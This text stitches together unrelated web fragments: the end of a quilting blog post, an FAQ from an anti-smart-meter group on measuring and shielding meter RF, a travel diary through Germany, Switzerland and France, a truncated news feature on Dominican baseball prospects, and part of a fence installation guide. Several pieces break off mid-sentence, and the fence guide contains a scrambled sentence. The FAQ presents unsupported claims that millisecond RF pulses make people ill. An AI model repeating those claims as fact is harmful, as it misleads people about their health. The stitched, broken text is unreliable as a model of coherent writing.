would be delighted to see some of <strong>YOUR</strong> free motion quilting. &#xa0;Send me photos or links&#x2026;I&#x2019;d love to share them!</p>   <p>Please remember&#x2026;all the tutorials and photos are the property of<em> Lori Kennedy</em> at <strong>The Inbox Jaunt. &#xa0;</strong></p>   <div>    <div>     <h3>Please share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>  
   <div>   <p><strong>&#xa0;<strong>&#xa0;<strong> _________________________________</strong></strong></strong></p>   <p><em><strong>Q: Can I measure the RF radiation of my &#x201c;smart&#x201d; meter myself?</strong></em></p>   <p>Yes, you can purchase a meter for relatively low cost and learn how to read it yourself. There are several consumer devices on the market that measure the radiation that &#x201c;smart&#x201d; meters emit. We recommend the Cornet ED78S as an entry-level, complete, and portable meter, and .</p>   <p>One of the issues with &#x2018;smart&#x2019; meters is that they have extremely short spikes of RF&#x2014;usually just 2-3 milliseconds (2/1000th of a second). While your utility would have this sound harmless, it seems clear from the number of health complaints that the <strong>human nervous system has no trouble registering a signal that is that brief</strong>. In fact the electrical signals throughout our body go off in similarly brief periods of time. Some measuring devices built to measure conventional fields of RF may not have a &#x201c;sampling rate&#x201d; sufficient to pick up the extremely brief individual pulses. The has a high sampling rate and is able to accurately measure smart meter radiation.</p>   <p>Most electric &#x201c;smart&#x201d; meters are in the 800-1000 MHz (megahertz) range of the radio-frequency microwave band. Gas meters can be in the 400-500 MHz range, and in-home appliance networks (HAN) (including the 2nd radio in the &#x2018;smart&#x2019; meter) are in the 2.4-2.5 GHz (gigahertz) range. The measures 100 MHz &#x2013; 8 GHz.</p>   <p>One citizen-scientist posts videos online showing how various meters work: </p>   <p><em><strong>Q: Can I shield my living space from the RF radiation from my &#x201c;smart&#x201d; meter?</strong></em></p>   <p>It might be possible, but we don&#x2019;t guarantee your results.</p>   <p>The idea of shielding is to place a RF barrier between you and the source of the RF. Several materials block RF radiation. Here is a basic explanation of how shielding can be set up: . (Stop Smart Meters does not necessarily endorse the products on this website, but this is useful information.)</p>   <p>Aluminum foil, especially the heavy-duty type, in two layers, overlapping, can block a good deal of RF (shiny side toward the source of the RF). Aluminum mesh screening from a hardware store can effectively shield RF as well. Here is a video demonstrating this: </p>   <p>However, we would like to make clear that shielding can produce unwanted or unexpected problems. Shielding without being able to measure the resulting effectiveness is not recommended. Shielding in the presence of multiple sources of RF is not recommended&#x2014;a shield against one RF source can act to reflect and intensify the RF from another source. Some people harmed by &#x201c;smart&#x201d; meter installations have not found relief with shielding. So we recommend trying it with important several caveats:</p>   <p>&#x2013;If your &#x201c;smart&#x201d; meter has made you sick, first disconnect all other wireless devices, wifi, cordless phones, microwaves, fluorescent light bulbs, etc. then shield with care, and pay close attention to how the change makes you feel.</p>   <p>&#x2013;Get help doing it, because if you are sensitive, you do not want to be standing directly in front of the meter for any period of time.</p>   <p>&#x2013;Consider hiring an EMF consultant to aid you in your plans.</p>   <p>&#x2013;Buy an to measure the radiation in your environment, so you can shield in the right places and measure the results.</p>   <p>&#x2013;Try several things before you give up.</p>   <p>&#x2013;Document what you do&#x2014;we are interested, and any successes can be shared here.

We have information from a southern California utility customer who shielded her gas meter, so as to cut the RF going into her house, but not cut it off from communicating with the mesh network. She measured the RF before and after, and says the amount entering her home from the gas meter was greatly reduced. She used a flexible metal screening mesh from a big-box store and a stapler, wrapping the meter and stapling it in place, and then cutting an opening in the side furthest from her house, to let the signal out. This she says, appears to direct the RF away from her home. Stop Smart Meters! can&#x2019;t assure your results, nor the safety of this arrangement.</p>  </div>  
   <div>   <p>Leaving On A Jet Plane</p>   <p>Traveling internationally by plane is not very relaxing. Crowded in a tiny capsule for 7 hours over the Atlantic Ocean with no way way to stretch out or get comfortable let alone sleep, it&#x2019;s no surprise Jaggar and I are tired and cranky by the time we reach Munich. The 4 hour each layovers in New York and Frankfurt didn&#x2019;t help either, but at least we have a room waiting when we finally get downtown and our AirBnB check in goes without a hitch. Actually, there&#x2019;s no check in at all &#x2013; we just walk up to the room and the key is in a red box next to the door. </p>   <p>Munich</p>   <p>After close to 24 hours of solid travel, we drag our jet-lagged asses across the street to Holy Burger &#x2013; not highly reviewed on Yelp!, but a real organic beef burger and a genuine German lager really hits the spot. We drink in our first taste of international ambiance in the small, quaint establishment. The friendly waitress speaks German and English. As a matter of fact, everybody here seems to speak both languages. </p>   <p>Can you say &#x2018;giant, old churches&#x2019;? Well, Munich has them in spades. While I&#x2019;ve seen my fair share of gothic and baroque architecture on previous European trips, Jaggar has not and is awestruck by the monumental structures. Mighty and ornate, there are just no comparable buildings in the United States so steeped in history that match such grandeur. I even got to see St. Mundita, the jeweled skeleton, in . They wouldn&#x2019;t let me take a picture though, because mass was in session. Dammit. </p>   <p>As it turns out, today is national holiday in Germany and most of the shops, including the Viktualienmarkt (and a pastry shop I wanted to visit) are closed. Maybe it&#x2019;s a blessing in disguise because the streets are not crowded with tourists and we feel like locals (kind of). It&#x2019;s brisk, overcast and a little chilly. After walking the city all morning, we stop and get a sausage, mashed potatoes and sauerkraut (and a beer, of course). Delicious. Again, we&#x2019;re struck by the freshness and wholesome heartiness of the local cuisine. Maybe it&#x2019;s my imagination, but I can&#x2019;t taste any GMOs or gluten fillers. I hope my American digestive system can cope. </p>   <p>After making sure we visit the sacred Michael Jackson monument, we circle by the Residenz Museum (without going in) and head for the just to the north. The clouds break and instantly it&#x2019;s sunny and warm. Suddenly, Germans everywhere are outside and enjoying the open spaces. There are a lot of young families with little children all enjoying this beautiful park. We find a bench and sit for a while silently watching all the people. </p>   <p>Tired as all hell from walking all day, we take a tram back to the hotel and crash for a few hours. While Jaggar is still asleep, I get up and walk around the neighborhood, finding a McDonald&#x2019;s (which I forego entering) and a lovely gelato place a few shops down. Of course I get 2 scoops, one chocolate and the other mint. When I get back Jaggar is still sleeping. </p>   <p>Tomorrow, Salzburg.</p>   <p>There are a lot of young children on the train, so the atmosphere during the 2 hour trip is noisy and chaotic. Jaggar and I have to snicker more than a few times because there is clearly one rambunctious child that is exasperating the chaperones. Not surprisingly, the child&#x2019;s name was &#x201c;Maxi&#x201d;. Every 5 minutes we hear someone frustratingly exclaim, &#x201c;Maxi &#x2013; nein!&#x201d;. Reminds me of my son Maximilian, who was quite a handful when he was an inquisitive (and quite naughty) young child. I must have exclaimed &#x201c;Maxi &#x2013; nein!&#x201d; more than a few times myself.</p>   <p>We picked a bad weather day to see the Salzburg tourist sites because it rains most of the afternoon. We skip the Fortress but check out the churches and cemeteries and the rain creates an eerie, surreal mood. I can see that during summer and with good weather old town Salzburg would be more obviously picturesque, but today it is just rainy and cold and the tourists that are here are all crowded under the stone passages leading in and out of the alleys and narrow streets trying to escape from getting wet. </p>   <p>We find respite in a Rick Steves recommendation &#x201c;Wilder Man&#x201d;, a cozy restaurant with only 9 tables nestled off the beaten track and run by an actual mom and pop (in real lederhosen). I counted three separate groups at different tables all with Rick Steves guidebooks in tow. During our meal, a charming Swiss woman vacationing with her mother is seated with us (all the tables are picnic tables) and we ended up talking with them in broken English and Swiss for over 2 hours. Without ever exchanging names, we converse about our respective backgrounds, we a father and son from desert Arizona and they, a mother and ex-professional company ballet dancer (one of triplets, no less). Coincidentally, the pair are from St. Gallen, a city we will be visiting later this week. Funny that they were surprised that, as Americans, we were not eating hamburgers (meat) at McDonald&#x2019;s (they were both vegetarians). We are not offended and laugh at the American stereotype. </p>   <p>After a shot of Schnapps at Spore full of old men drinking brandy standing up, we head for and the cemetery at St. Sebastian. Another beautiful park made even more mysterious by the misty, afternoon drizzle. The weathered tombstones are covered in moss and today&#x2019;s rain. We can barely see the Fortress up on the hill over old town Salzburg through the foggy chill. </p>   <p>We were advised by our Swiss friends to go to the the Sacher Hotel for famous Austrian (a rich, chocolate cake), which we do and after coffee and a loop back to Mirabell to take pictures with the garden gnomes, we head to the train station and back to Munich. </p>   <p>Dachau</p>   <p>It is a cloudy Wednesday morning and we are at the . The bus ride from the train station is crowded and the mood of the tourists is somber. At the camp entrance, we are all silent as we enter through the <b>iron</b> <b>gates</b> into the main compound. All we hear is the soft wind through the trees and the shuffle of the tourists footsteps over the white gravel. </p>   <p>It is hard to describe the feeling as we walk past the empty foundations of the barracks, the guard towers and the crematorium. Photographs alone do not do the experience justice and what you can&#x2019;t get vicariously from a pictorial portrayal is the overall veil of fear and horror that is visceral. You can feel death looking over your shoulder. There are many German school groups here, mostly teen-agers. Perhaps this country&#x2019;s citizens are reminding themselves that they are the beneficiaries of an infamous heritage they have to continually remind themselves of in the hope of something like this never being able to happen again. </p>   <p>We take the train back to Munich and briefly tour the English garden before heading back to the old town for a Schnultnoodle pastry, a stroll past the (both open today) and St. Peter&#x2019;s Church where I&#x2019;m finally able to get my picture of St. Mundita, the skeleton in a box. would be proud. </p>   <p>I drop Jaggar back at the hotel and take the tram up to to see the collection of rare, museum-quality artifacts. A lovely German woman with long, blonde braided hair (who reminds me of what I imagine the fairy tale Gretel would look like) walks up to me and, as we are the only two people in the gallery, she proceeds to give me a personal guided tour of the gallery&#x2019;s cabinet of curiosities. I tell her I was able to acquire one of Georg Lau&#x2019;s out-of-prints books on eBay and she seems suitable impressed enough to give me a complimentary gallery edition of the newer works because I&#x2019;m such a fan.</p>   <p>Jaggar and I get hungry around 9:00 PM and so we hike over to the , the oldest bierhaus in Munich. Down some dizzying circular stairs to the cellar and we are seated next to a thirty-something Austrailian couple who we make interesting conversation with over a pint of the local beer and some schnitzel. We lose track of time talking about the Grand Canyon and the Great Barrier Reef and after saying our good-byes, we go back to the room and crash. </p>   <p>F&#xfc;ssen</p>   <p>Good heavens, there are a lot of Asian tourists on this train! Mostly they are female, young and very cute, though. Odd.</p>   <p>So far this trip, the geography mostly reminds me of Michigan or Ohio &#x2013; flat, some rolling hills and very green with large trees and thick foliage. Very rural, with cows and horses grazing on the steep pastures. Now, as we are getting closer to the Alps, the countryside is taking on a much more European flavor, at least the flavor I imagined it would have. Grassy hills with Alpine cottages (which all look very similar) and jagged, snow covered mountains in the background. Most houses have solar panels on their roofs. I&#x2019;ve seen a lot of solar panels since we&#x2019;ve been here.</p>   <p>Not much more that can be said about King Ludwig&#x2019;s castles that hasn&#x2019;t already been repeated in numerous guidebooks. Suffice to say, are awesome in every way and we were blessed with a beautiful sunny day to drink in the unfortunate king&#x2019;s opulance. We didn&#x2019;t know we&#x2019;d be walking as much as we did, though as the castles are a good distance apart on opposite hills. But the sights make the climbs rewarding. We were there later in the day so we follow most of the early crush of tourists who were on the train with us in the morning. I couldn&#x2019;t get Jaggar to walk out to the middle of Mary&#x2019;s Bridge so he missed a high point of the day, in my opinion. The view is spectacular and the bouncy wood planks lend an air of danger to the experience. </p>   <p>We get back to the hotel around 8:00 completely exhausted and head straight for the cafe/restaurant for some salad and spatzel with lentils. Next to us is seated another mother and daughter traveling tag team from Baltimore with a book in plain site. It turns out the daughter has just graduated from college and they are traveling in the opposite direction as we, towards Munich after their own castle tour the next day. The daughter Becky, has just received her degree in Mechanical Engineering and will be starting a job in Milwaukee when they return to the U.S. We tell them the weather was beautiful at the castles, but heard that it would be changing tomorrow when the would be visiting. We say goodnight and fall asleep minutes after hitting our beds.</p>   <p>On To Switzerland</p>   <p>Travel day to Bern via St. Gallen. Five different train changes. We stop in St.Gallen around 11:00 get a&#x201c;sausage in a bag&#x201d; and head for the . You have to wear felt slippers so your feet don&#x2019;t scratch the floor. The library has some of the most ornate wood embellishments of any interior we&#x2019;ve seen so far and contains manuscripts from as far back as 500 BC. We have a slab of Swiss chocolate and an espresso just outside of the church common grounds for 11 CHF and watch the children play amongst the business men and women soaking up the sun on their lunch hours. </p>   <p>St.Gallen to Zurich. We see cannabis ice tea for sale in a vending machine. Now that&#x2019;s something new! Lots of children, teenagers and all other aged folks hurrying about their way at the train station. It&#x2019;s rush hour on a late Friday afternoon. </p>   <p>We get to Bern and find our accommodations without any trouble. This is our first hostel of the trip and my apprehensions disappear when we find a homey, dorm-like room with bunk beds, wi-if and free transportation cards to get us up the steep hill by funicular to downtown. After dinner, we wander through the pedestrian streets, checking off all the mandatory sites &#x2013; , the Bern Clock Tower and the child-eater statue. On our way back to the hostel, we pass by an immense gothic church under construction and enter to discover a choral group and orchestra rehearsing for an up coming concert. We sit in the nearest pew and watch as the only two spectators besides the musicians themselves. A sublime moment. </p>   <p>Gimmelwald and the Swiss Alps</p>   <p>The train from Bern to Lauterbrunnen winds through a narrow valley of sheer cliffs before stopping at a cable car station that whisks us up to the tiny village of Gimmelwald. The scenery is breathtaking &#x2013; the only sounds are the birds and the numerous waterfalls crashing to the valley floor from across the canyon. There are tens of hang gliders all hovering over the valley floor like schools of jellyfish, floating on currents of cool air. We hike up the trail in Gimmelwald as far as our bodies will allow considering we are not used to the altitude and snap pics of snow covered peaks, farm animals and the quaint village engulfed in nature&#x2019;s monumental majesty. We rest and relax the rest of the day, sipping coffee and drinking in the fresh mountain air. Tomorrow we travel to Lausanne, stopping for lunch in Interlaken and taking the Goldenpass Scenic train through the Swiss countryside to the lakeside city of Lausanne.</p>   <p>Lausanne</p>   <p>The train is a wonderful way to cross western Switzerland &#x2013; mountains, hills, farm animals and the Alps all viewed through large panoramic windows. Jaggar sleeps about the half the way, but I take pictures so he can see what he missed later. As we descend out of the mountains into Monteaux, I start humming a familiar tune to myself and sing the lyrics to Smoke on the Water by Deep Purple under my breath &#x2013; &#x201c;&#x2026;Frank Zappa and the Mothers were at the best place around&#x2026;&#x201d;. The Lake Geneva shoreline is much more populated and affluent than we&#x2019;ve seen over the last few days, but it is a welcome site and as we pull into Lausanne, we start hearing a lot of French and little German. In fact, when we explain to out AirBnB host that we&#x2019;ve just come from Interlaken, he says, without hiding any facetiousness, &#x201c;&#x2026;ah, Germany.&#x201d;. Clearly, we are in the land of the arrogant French. Lausanne is a beautiful town nestled in the hills above Lake Geneva. They&#x2019;ve got some awesome old churches, too&#x2026; </p>   <p>CERN</p>   <p>From Lausanne, we travel around the lake to Geneva for a day of scientific discovery. We meet Jaggar&#x2019;s physics professor from the University of Arizona, Dr. Kenneth Johns, who gives us a private tour of the collider facility and an invigorating walk around the compound. As the public tours were canceled just prior to us leaving for our trip, this was quite a lucky coup and the VIP treatment gives us insight into the facility we would not have gotten otherwise. That, and we had kangaroo stew at the cafeteria, which is something you don&#x2019;t have every day. Dr. Johns says that the facility operates under &#x201c;open science&#x201d; so we are allowed to take pictures of everything we see and the place is buzzing with students and scientists. Definitely worth the side trip from Lausanne. We were not consumed in a black hole or liquid helium explosion either&#x2026; </p>   <p>Switzerland is ridiculously expensive and we are paying an arm and a leg for everything from tram rides to coffee, so we are about ready to say goodbye and ride the TGV, France&#x2019;s high-speed train to Paris.</p>   <p>Paris</p>   <p>We arrive in Paris at noon on a Tuesday. Our flat for the next few days is right above an adult bookstore/shop, so that tells you a little about the neighborhood. But it is right near the Metro, a few blocks north of Notre Dame and (oddly enough) right across the street from a church. We have decided to get some of the touristy stuff out of the way so we head to the Seine, and walk along the Champs de &#xc9;lys&#xe9;es to the Arc de Triomphe. From there, we make a dash to the Eiffel Tower, take a few requisite photos and the head back &#x2018;home&#x2019;. We change our clothes and have our first (and only) fancy dinner in Paris. Jaggar loves the foie gras, but isn&#x2019;t crazy about the duck. </p>   <p>Wednesday is museum day, but first we have to visit the final resting place of the Lizard King at the cemetery. I&#x2019;ve been here before, but the cemetery has lost none of its surreal power. After all, where else can you visit Chopin, Balzac, Proust and Jim Morrison all at the same time? </p>   <p>Later in the afternoon, we cruise the Pompidou, eat some cheeseburgers and then make a night run at The Louvre. Rick Steves was right &#x2013; going on a night when the museum is open late really makes a difference with respect to the crowds. We breezed through the greatest hits in a few hours. Note: the Mona Lisa is much smaller in real life than you might imagine and really doesn&#x2019;t justify the enormous interest of the great majority of the tourists present when compared to the rest of the art on display. Personally, I liked the Venus de Milo. </p>   <p>The Paris Catacombs is a bust. We get here pretty early in the day, but the line of tourists wraps around the block and the wait is about two hours so we meander through the Luxembourg Palace gardens, browse at the bookstore (where Jaggar finds the second volume of Feynman&#x2019;s physics books in French which he immediately purchases) and then eat some bread and meat at a sidewalk cafe. </p>   <p>Two highlights come later in the afternoon &#x2013; the at the University of Paris Medical College and the , which is the famous Paris veterinary college. As a big fan of the M&#xfc;tter Museum in Philadelphia, I can say that the Mus&#xe9;e Depuytren does not disappoint when it comes to diseased and disfigured heads and limbs in jars. You can also get a photo with the Statue of Death around the corner in a garden alcove. </p>   <p>Fragonard, on the other hand, is a great place to see numerous types of animal skeletons as well as it&#x2019;s crown jewel, the &#xc9;corch&#xe9;s, a display of flayed and preserved cadavers made in 1865 later to be the inspiration for Gunther von Hagens&#x2019; Body Worlds in the 20th century. </p>   <p>On our last day in Paris and two things are happening &#x2013; it&#x2019;s starting to get hot and all the summer tourists are beginning to inundate the city. It&#x2019;s a good thing we&#x2019;re taking the train south of Paris to Orsay to visit Jaggar&#x2019;s new home come the fall, University of Paris Sud, where he&#x2019;ll start his Masters study in Physics. Orsay is a charming, rural town that (again) reminds me a lot of Michigan or Ohio. Definitely a slower pace than Paris, but only a 30 minute train ride away.</p>   <p>One more turn past Notre Dame before we have our final dinner in Paris and then crash early because the trip back to the USA is going to be a bitch! Oh, I forgot &#x2013; we need to see Montmartre. Packed with tourists and blisteringly hot, this was not the most memorable attraction, but we check it off the list nonetheless. </p>   <p>So long, Europe. See you later&#x2026; </p>  </div>

Despite his sweet swing and cannon arm, odds are more likely that life will get worse, not better.</em></p>      <div>       <em>If Miguel Almonte&#x2019;s Major League dreams fail, he will return to the Dominican Republic with little money, no education and no professional </em>      </div>      <div>       <em>skills, like Gipsy Veras. </em>      </div>      <p>&#xa0;</p>      <p>Story by <strong>Faiz Siddiqui, for NewsNetNebraska&#xa0;</strong><span>|</span> Photos &#xa0;by&#xa0;<strong>Nickolai Hammar</strong></p>      <p><span>SANTO DOMINGO, Dominican Republic &#x2014; A year after signing a contract with the Tampa Bay Devil Rays, Gipsy Veras sat shotgun in his new &#x2019;92 Camry, sipping a 40-ounce Presidente beer as the man driving took a swig of Johnnie Walker, Black Label.</span></p>      <p>It was a fitting end to a sleepless weekend, the conclusion of a 72-hour beach getaway that had the men sleeping with more women than they could remember, running up obscene tabs. The men jumped from city to city, stopping ashore in Cabarete, Puerto Plata, Gaspar Hernandez. They drank rum and Cokes and <em>pina coladas</em> on the water as their real girlfriends awaited them 200 miles away in Cout&#xed;. In one weekend, Veras alone blew more than 50,000 <em>pesos</em>, about $3,000.</p>      <p>Alone on the open road, and still wearing baseball pants they put on three days earlier, they shared memories of the mini-vacation as the aqua-colored Toyota whisked around S-shaped turns at 70 mph. Exhausted, Veras leaned his head on the cold car window and fell asleep.</p>      <p>Minutes later, his heavy eyelids opened back up.</p>      <p><em>&#x201c;Where are we?&#x201d;</em></p>      <p>A tree stump laid arms-length away, the new car resting calmly against the trunk. The car&#x2019;s hood smashed in. Blackness engulfed them.</p>      <p>&#x201c;<em>Mi carro</em>,&#x201d; Gipsy thought to himself. &#x201c;<em>Mi carro</em>.&#x201d;</p>      <p>The men were just lucky they didn&#x2019;t plunge off the cliff.</p>      <p>If Gipsy&#x2019;s foster brother Frank hadn&#x2019;t hit a tree, the two of them might have been dead, and Gipsy never would have become a pitching coach in the Blue Jays&#x2019; system, his most recent job. He wouldn&#x2019;t become someone who took all those pills.</p>      <p>He wouldn&#x2019;t have become anything.</p>      <p>And nearly 20 years later, prospect Miguel Almonte wants to become something.</p>      <p>&#x2022; &#x2022; &#x2022;</p>      <p>Yewri Guill&#xe9;n&#x2019;s head wouldn&#x2019;t stop throbbing. A free clinic doctor diagnosed the 18-year-old Washington Nationals signee with bacterial meningitis almost three years ago, but because the terms of his deal weren&#x2019;t yet complete, he couldn&#x2019;t foot the bill for a $1,300 stay at a private hospital. And the headaches continued.</p>      <p>The MLB investigated Guill&#xe9;n for identity fraud and suspended him for a year before he lay ill in a hospital bed, with the league claiming he lied about his birthday to increase his signing bonus. Guill&#xe9;n was supposed to travel to Florida to play for the Nationals&#x2019; rookie league team there in mid-April, after the MLB authorized his contract. But he never made it. Instead of flying to the United States April 15, 2011 as planned, he died in a clinic that day, according to a March story in Mother Jones.</p>      <p>Long before the incident came to light, Major League Baseball&#x2019;s relationship with the island nation was regarded as predatory by critics Dominican and American. Five years ago, the MLB sent activist Charles Farrell to Santo Domingo to examine the issues surrounding baseball in the country. What he found was a system that destroyed young lives: scouts, known as <em>buscones</em> or searchers, taking large cuts of players&#x2019; signing bonuses for themselves. Trainers pumping illegal substances into players to increase their chances of success. Players with no sense of money or how to manage it blowing their entire bonus checks in a matter of years, even in just a few months. Players routinely lied about their names and ages to increase their chances of being signed. MLB officials would never know his real name, but Gipsy Veras fell into nearly every trap.</p>      <p>The problem is simple: MLB teams like the Blue Jays treat Dominican players as investments, looking at the country as an arm of a larger $4 billion business model. And the minimum age to sign Dominican players, 16, &#x2013; &#x201c;and they&#x2019;d take them younger if they could,&#x201d; Farrell says &#x2013; reflects the league&#x2019;s attitude. Players in the United States must be 18, or have completed high school to sign. Teams regard the Dominican Republic as an unregulated free agent pool.&#xa0; And young Dominicans feed into it.</p>      <p>They want to have it made. Problem is, on opening day last year, only 83 of their countrymen appeared on rosters. One out of 50 signees will ever make it to the majors. And that&#x2019;s just for a single day, a cup of coffee. For many, the journey to get there &#x2013; or the aftermath of getting cut &#x2013; will be the most difficult part.</p>      <p>The question now is where baseball will take 17-year-olds like Almonte, a Blue Jays prospect who signed a $100,000 contract July 2.&#xa0; The odds facing kids like him are long &#x2013; &#x201c;astronomical,&#x201d; in Farrell&#x2019;s eyes.</p>      <p>The fates of thousands like Gipsy, on the other hand, have already been sealed. After stints as pitching coach with the Minnesota Twins, Los Angeles Dodgers and most recently the Blue Jays, the 35-year-old is now working as a trainer and scout for young Dominican players. But for him, life after baseball almost didn&#x2019;t happen at all.</p>      <p>Like him, thousands will return to the Dominican Republic after seeing their Major League dreams fail, with little money, no education and no professional skills.</p>      <p>Miguel Almonte just hopes he&#x2019;s not one of them.</p>      <p><em>Miguel Almonte has worked at making it to the United States to play baseball since he was 7. For many in his position, there&#x2019;s weight to succeed from birth, to lead families out of poverty and be the salvation for entire neighborhoods and villages in the country.</em></p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><em>&#x201c;Leading off for the Blue Jays, shortstop&#x2026;&#x201d;</em></p>      <p>The announcers still haven&#x2019;t learned how to say his name. Maybe, they never will. But at age 17, Miguel Almonte is already batting ahead of all-stars Jos&#xe9; Bautista and Edwin Encarnaci&#xf3;n.</p>      <p>The manager had to bench the teenager&#x2019;s favorite player, Jose Reyes, to make this lineup possible. But early on into the season, the move is paying dividends. Through a few months of play, Almonte bats .315 with 10 homers. The 5-foot-11, 186-pound teen is one of the most feared hitters in the American League East. He&#x2019;s dominating.</p>      <p>The fantasy is getting more real by the day. And sure, it&#x2019;s only possible in video game form right now &#x2013; Miguel, still stuck playing and managing his MLB 2K11 Blue Jays team. But lately, the dream&#x2019;s been starting to feel tangible.</p>      <p>On a muggy December afternoon in east Santo Domingo, the acne-ridden teenager sits in his mom&#x2019;s patio hair salon, swiping through pictures on his smartphone before baseball practice. He&#x2019;s easily the best-dressed person in the neighborhood today, wearing a plaid shirt with rolled-up sleeves, fitted blue jeans and a silver wristwatch.</p>      <p>&#x201c;This one is cheap,&#x201d; he says, referring to the timepiece, the label on which reads &#x201c;Bell.&#x201d;</p>      <p>As his mother applies rollers to   <div>   <h1>How to Install Allure Aluminum Fence</h1>   <div>    <p>Allure is Home Depot&#x2019;s signature series of aluminum fences. Installing a fence is a long-term investment and can be expensive. By reading through these directions you can figure out whether Allure aluminum fence is the right choice for you before you buy any sections, posts, parts, or accessories. With a little preparation, the process can be a lot easier and you&#x2019;ll know exactly what you need to do to install a fence around your yard, pool, or business. The PDF we provide will be the basic installation manual offered by Home Depot. Although the PDF is incomplete, we provide the missing instructions for you, and a full installation manual should come with any fencing order. This page offers a similar layout and a few extra tips to make installation easier for you.</p>    <p><strong>Remember:</strong> When installing Allure aluminum fences, keep in mind local municipalities may require permits and have different zoning laws or require other special considerations before modifying your property. Even if your location does not, it is generally a good idea to be cautious and install the fence at least 2&#x201d; inside the property line. Additionally, utility companies may run power, gas, water, or other lines underground. Be sure to check with your local providers since these lines may run underground near where post holes would be dug along your planned fence line.</p>    <p>&#xa0;</p>    <h2>Fence Planning</h2>    <p>After you&#x2019;ve checked your local zoning laws and where utility lines may be running, it&#x2019;s time to get started. Before you order materials, you&#x2019;ll need to know how many aluminum fence sections, gates, posts, caps, and decorative accessories you&#x2019;ll need. If your property is relatively flat, you may be able to work with an accurate diagram of your property lines. If you don&#x2019;t have an accurate drawing of your property lines or plan to install fence sections on a slope, it may be best to go out and measure the fence line yourself.</p>    <p>Run strings along each side of the fence. This will help you get an accurate physical measurement for when you order materials. Also keep in mind that gates will need to be on level ground. As a general guideline, you will need a gate, line, or corner post for every section of fence and gate as well as two end posts. After you&#x2019;ve got a good diagram and figured out how many posts you&#x2019;ll need, you can order your materials. Home Depot may not have everything on-hand, so allow time for them to ship fencing supplies from their warehouse to your local store. You may also be responsible for delivering the fencing to your property when buying through Home Depot. The company does not offer installation, but does partner with local building companies for installations.</p>    <p>Once you&#x2019;ve gotten all the materials for your Allure fence, it&#x2019;s time to pick a day and gather your tools. Be sure to have either an auger or a post hole digger. If this is a do-it-yourself project, we recommend an auger, since post holers are less precise and are more physically taxing than mechanical and hydraulic augers. Nice weather is also important since it will make the work easier and cause fewer problems with the ground and concrete. Installing a fence can also be a lot of exercise and hard work if you&#x2019;ve never done it before. If you plan to complete your fencing project in a few days, it might be good to have a few extra people. You will need the following materials and tools to install your Allure fencing:</p>    <ul>     <li>Aluminum fencing sections, posts, gates, and decorative accents</li>     <li>Concrete</li>     <li>Measuring tape</li>     <li>A way to mark where fence posts will be placed</li>     <li>An auger or a post hole digger</li>     <li>A hack saw or circular saw</li>     <li>A rubber mallet</li>     <li>A screw driver and</li>     <li>A power drill</li>    </ul>    <p>The first step when installing your fence is to dig post holes. If you plan to complete the project in a single day, it may help to dig all the post holes before mixing concrete or installing any fencing sections. If you plan to install the fence over the course of several days or a week, you may want to dig holes for the posts and number of sections you plan to install that day. Digging post holes more than a day in advance runs the risk of having rain or other environmental factors to damage the holes.</p>    <p>Gate posts are generally manufactured with extra aluminum alloy and have a thicker wall, so they are stronger and sturdier than line, corner, and end posts. As such, installing the gate is a good place to begin. To start, dig post holes about 3&#x2033; to 4&#x2033; wider than the gate on centers. Next, Home Depot&#x2019;s directions recommend that, for Allure aluminum fences, you do not install more than one gate per fence section to be installed. You can always install more gates when you reach that point in the fence line.</p>    <p><strong>Be Careful! </strong>If you live in an area where ground frost occurs, the frost could extend into the concrete beneath your fence posts and cause the concrete to crack and destabilize the fence posts. The best course of action is to dig below where the frost reaches and extend the concrete to this depth. For example, you may need to dig deeper in North Dakota than Ohio. If you&#x2019;re installing fences in Arizona, this likely won&#x2019;t even be a concern. Local zoning laws may also specify a minimum or maximum depth for the concrete in post holes. Be sure to check with your local municipality before installation.</p>    <p>&#xa0;</p>    <h2>Installing Fence Posts</h2>    <p>Once the post holes are dug and the post is in an upright position, set the concrete at roughly 4&#x2033; below the ground&#x2019;s surface so grass can grow over the post hole.&#xa0; For easier lawn maintenance, set the concrete at 2&#x2033; &#x2013; 3&#x2033;. It is also recommended that if you are installing an aluminum pool fence, you use a maximum depth of 2&#x2033;. Keep in mind that pre-punched posts must be facing the correct way to install fencing sections. Line posts are punched on opposite sides, corner posts on adjacent, and end posts on only a single side.</p>    <p>When installing fence post caps, use a rubber mallet to avoid damaging the post cap or moving the post as the concrete sets. Although it helps to use a rubber mallet, the hammer could still damage the post caps, so use caution when installing the caps. See Figures 2 and 3 for diagrams on post and post cap installation for Allure aluminum fences.</p>    <p>&#xa0;</p>    <p>When installing a single gate, set the gate opening 1&#x2033; wider than the actual measurement of the gate. As an example, Allure&#x2019;s 48&#x2033; gates actually measure 47&#x2033; wide and the gate opening will need to be 48&#x2033; wide. For further information, see Figure 4. When installing a double drive gate, gate openings must be 2&#x2033; wider than gate width to accommodate the extra gate. For example, two 48&#x2033; gates will actually measure 94&#x2033; and require an additional 2&#x2033; during installation, totaling 96&#x2033;.&#xa0; For an installation diagram of a double gate, see Figure 5.</p>    <p><strong>Note</strong>: When installing gate posts, note the direction the post is facing. Some aluminum fence posts have pre-punched holes. This means the left gate post may differ from the right gate post and the hinge post holes will be on opposite sides. This will impact which direction the gate swings. Keep this in mind when positioning gate posts. Allure gate posts usually do not have pilot holes, so you will likely need a power drill when installing your gate.</p>    <p>Next, fill the post holes with a stiff concrete mix and ensure that the concrete extends below the bottom of the post to create a solid foundation. This is especially important when installing gates. Brace the posts as necessary to keep them upright and straight while the concrete sets. The aluminum fence slots must be facing the correct views.

direction, once the concrete sets, there will not be a way to change this.</p>    <p>&#xa0;</p>    <h2>Gate Installation</h2>    <p><strong>Warning:</strong> Do not install the gate before aligning the gate posts and the concrete sets. Gate posts are manufactured with more aluminum because they must handle the additional weight of the gate. Hanging the gate before the concrete sets could cause the fence posts to settle at an angle and cause problems with the remaining fencing sections.</p>    <p>Once the gate posts have been installed and the concrete sets, you can hang the gate. Remember, gates must be installed on level ground. Next, position the hinges as far apart as you can on the gate for maximum stability and clamp the hinge post leaf to the gate post. Position the hinge post leaf completely flush and plumb against the fence post and gate to avoid binding. See Figure 6 below.</p>    <p>&#xa0;</p>    <p>Now, attach the hinges to the post by drilling 7/64&#x2033; pilot holes and fastening with screws provided. Again, remember that the gate will swing based on the side of the gate post where you drill the pilot holes, so be sure to drill facing the direction you want the gate to swing in. Once the pilot holes have been drilled, center the gate over the pilot holes and attach it to the gate 